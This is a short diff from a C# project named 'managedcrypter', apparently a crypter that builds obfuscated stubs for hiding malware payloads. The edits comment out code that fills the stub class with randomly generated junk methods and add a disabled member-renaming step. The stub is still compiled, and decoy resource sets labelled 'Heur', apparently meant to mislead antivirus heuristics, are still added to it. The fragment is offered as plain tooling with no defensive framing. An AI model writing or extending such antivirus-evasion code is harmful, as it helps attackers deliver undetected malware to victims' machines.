@@ -137,16 +137,16 @@ namespace managedcrypter
 
             /* primitive usg */
             {
-                StringBuilder sb = new StringBuilder();
-                MethodGen mtdGen = new MethodGen();
+                //StringBuilder sb = new StringBuilder();
+                //MethodGen mtdGen = new MethodGen();
 
-                for (int i = 0; i < 50; i++)
-                    sb.AppendLine(mtdGen.RandMethod());
+                //for (int i = 0; i < 5; i++)
+                //    sb.AppendLine(mtdGen.RandMethod());
 
-                Utils.ReplaceStringInFile(
-                    sDirectory.Source.Files["stub_class"],
-                    StringConstants.STR_JUNK,
-                    sb.ToString());
+                //Utils.ReplaceStringInFile(
+                //    sDirectory.Source.Files["stub_class"],
+                //    StringConstants.STR_JUNK,
+                //    sb.ToString());
             }
 
             Console.ReadLine();
@@ -195,7 +195,9 @@ namespace managedcrypter
                 if (sCompiler.CompileSource(sDirectory, cInfo))
                     Console.WriteLine("Successfully compiled stub!");
 
-                ResourceGen.CreateHeurAcceleratorSet(cInfo.OutputDestination);      
+                // MemberRenamer.RenameMembers(cInfo.OutputDestination);
+
+                ResourceGen.CreateHeurAcceleratorSet(cInfo.OutputDestination);
                 ResourceGen.CreateHeurDialogSet(cInfo.OutputDestination);
                 ResourceGen.CreateHeurMenuSet(cInfo.OutputDestination);
                 ResourceGen.CreateHeurStringSet(cInfo.OutputDestination);
